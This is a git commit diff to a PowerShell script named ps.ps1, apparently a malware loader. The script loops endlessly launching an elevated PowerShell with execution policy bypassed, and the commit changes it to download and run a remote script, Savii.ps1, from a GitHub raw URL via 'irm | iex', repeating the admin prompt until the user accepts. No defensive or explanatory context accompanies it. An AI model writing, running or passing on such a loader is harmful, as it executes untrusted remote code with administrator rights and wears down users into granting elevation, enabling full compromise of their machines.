27f962aa6ae8374ff4d5384c229b0722491db63d
ashlion-jpg <andresreus266@gmail.com>
2026-06-15 12:25:33 +0600

    Update ps.ps1

--- ps.ps1
+++ ps.ps1
@@ -1,8 +1,9 @@
 do {
     try {
-        Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm ps.ps1 | iex"' -Verb RunAs
+        Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1 | iex"' -Verb RunAs
         $success = $true
     } catch {
         $success = $false
     }
 } until ($success)
+
